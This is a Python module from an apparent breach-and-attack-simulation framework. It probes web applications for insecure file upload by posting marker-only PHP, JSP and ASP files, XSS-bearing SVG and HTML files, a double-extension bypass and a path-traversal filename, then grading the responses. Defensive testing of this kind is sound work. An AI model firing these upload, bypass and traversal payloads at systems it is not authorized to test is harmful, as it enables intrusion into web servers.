"""Insecure File Upload testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

UPLOAD_PAYLOADS = [
    ("test.php", "<?php echo 'BAS_UPLOAD_TEST'; ?>", "application/x-php"),
    ("test.php.jpg", "<?php echo 'BAS_UPLOAD_TEST'; ?>", "image/jpeg"),
    ("test.phtml", "<?php echo 'BAS_UPLOAD_TEST'; ?>", "application/x-php"),
    ("test.jsp", '<% out.println("BAS_UPLOAD_TEST"); %>', "application/x-jsp"),
    ("test.asp", '<% Response.Write("BAS_UPLOAD_TEST") %>', "application/x-asp"),
    ("test.svg", '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text>BAS</text></svg>', "image/svg+xml"),
    ("test.html", '<script>alert("BAS_UPLOAD_TEST")</script>', "text/html"),
    ("..%2F..%2Ftest.php", "<?php echo 'BAS_UPLOAD_TEST'; ?>", "application/x-php"),
]

class FileUploadModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="file_upload", description="Insecure file upload - extension bypass, content-type bypass",
            category="file_upload", mitre_technique_ids=["T1190"],
            mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.STANDARD, owasp_category="A04:2021 - Insecure Design",
            cwe_ids=["CWE-434"], tags=["upload", "rce", "webshell"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        return [f"{name}|{content}|{ct}" for name, content, ct in UPLOAD_PAYLOADS]

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        for p in payloads:
            parts = p.split("|", 2)
            if len(parts) == 3:
                filename, content, ct = parts
                boundary = f"----BASBoundary{uuid.uuid4().hex[:8]}"
                body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
                        f"Content-Type: {ct}\r\n\r\n{content}\r\n--{boundary}--")
                requests.append(AttackRequest(request_id=f"upload-{uuid.uuid4().hex[:8]}", target=target,
                    method="POST", path=options.get("upload_path", "/upload"),
                    body=body, content_type=f"multipart/form-data; boundary={boundary}",
                    headers={"X-BAS-Filename": filename}))
        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text.lower()
        filename = request.headers.get("X-BAS-Filename", "")
        if response.status_code in (200, 201) and ("upload" in body or "success" in body or "stored" in body):
            ext = filename.split(".")[-1] if "." in filename else ""
            if ext in ("php", "phtml", "jsp", "asp", "aspx"):
                return ModuleResult(module_name="file_upload", target=request.target, status=VulnStatus.VULNERABLE,
                    payload_used=payload, response_code=response.status_code, response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms, evidence=f"Executable file uploaded: {filename}",
                    severity="critical", mitre_technique_id="T1190", detail={"filename": filename})
            return ModuleResult(module_name="file_upload", target=request.target, status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence=f"File accepted: {filename}", severity="medium", mitre_technique_id="T1190")
        return ModuleResult(module_name="file_upload", target=request.target, status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
